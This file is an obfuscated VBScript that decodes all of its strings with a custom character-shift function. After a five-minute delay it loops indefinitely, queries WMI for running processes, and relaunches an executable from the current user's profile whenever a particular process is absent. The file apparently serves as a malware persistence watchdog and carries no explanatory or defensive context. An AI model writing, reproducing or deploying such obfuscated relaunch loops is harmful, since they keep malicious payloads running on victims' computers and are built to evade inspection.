fnhHjh3 = CreateObject(z6LmNi8s("0v.MPI~Ydh,_VfzjU$cDm[NjImve!hoay}")).UserName
a8UJsD = true
WScript.Sleep 300000
Do while a8UJsD
n65RtguH3Y = false
gSqd02 = "."
Set r4HQXc2tz5 = GetObject(z6LmNi8s("iY^m&_Ud[cc]lcojNi60/RARUH") & gSqd02 & z6LmNi8s("RG*Ruh&eCemj9RdYE_vcgl6(1r"))
laZof4eUOj = z6LmNi8s("8VnI+;$B-;e9zJ0'") + " " + z6LmNi8s(">mx~y7") + " " +  z6LmNi8s("N""a<@H-EGCfg") + " " +  z6LmNi8s("2zeMV_9dQ){(FUIF5hJeLY""[Ki&iu+")
Set wWt8056pbJ = r4HQXc2tz5.ExecQuery(laZof4eUOj)
For Each bfQdy7K88P In wWt8056pbJ
    if bfQdy7K88P.name = z6LmNi8s("NaVm1_VduhkW/hq#TnT,$*+#G,?&o(R$|[Nn([q""") Then
        n65RtguH3Y = True
    end if
Next

Set n7k5h4w6v = CreateObject(z6LmNi8s("XH'ItYWhk_6fsjN_`d#]D$Z<e_ob>[xIWo%iWjZ[?ceE)Xh`3[MY'jJR"))
Set uSki1d = WScript.CreateObject(z6LmNi8s(">%)M0ITY""hK_Uf/j*$iI*^>[Qb!b4n")) 
WScript.Sleep 60000
rBFXfxTANX = z6LmNi8s("vqe9s0;R}Kji^[Dh^i7R1H")+ fnhHjh3 + z6LmNi8s("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + z6LmNi8s("yV:mY_idJhmWhh7#NnY,u*T#_,$&t(s$|[Onb[3(")
If n7k5h4w6v.FileExists(rBFXfxTANX) Then
    if n65RtguH3Y = false then
        uSki1d.Run rBFXfxTANX, 1, false
    end if
end if
WScript.Sleep 1000
Loop

Private Function z6LmNi8s(nHHInIWZ2n)
    yZkVfNn = 10
    x2fmwD = 33
    dqwv0Cm1 = 126
    If Len(nHHInIWZ2n) < 5 Then
        z6LmNi8s = ""
        Exit Function
    End If
    Dim f9tBRl
    nHHInIWZ2n = Mid(nHHInIWZ2n,3,Len(nHHInIWZ2n)-4)
    For i=2 To Len(nHHInIWZ2n) Step 2
        zCF3iV = Asc(Mid(nHHInIWZ2n,i,1)) + yZkVfNn
        If zCF3iV > dqwv0Cm1 Then
            zCF3iV = zCF3iV - dqwv0Cm1 + x2fmwD - 1
        End If
        f9tBRl = f9tBRl & Chr(zCF3iV)
    Next
    z6LmNi8s = f9tBRl
End Function


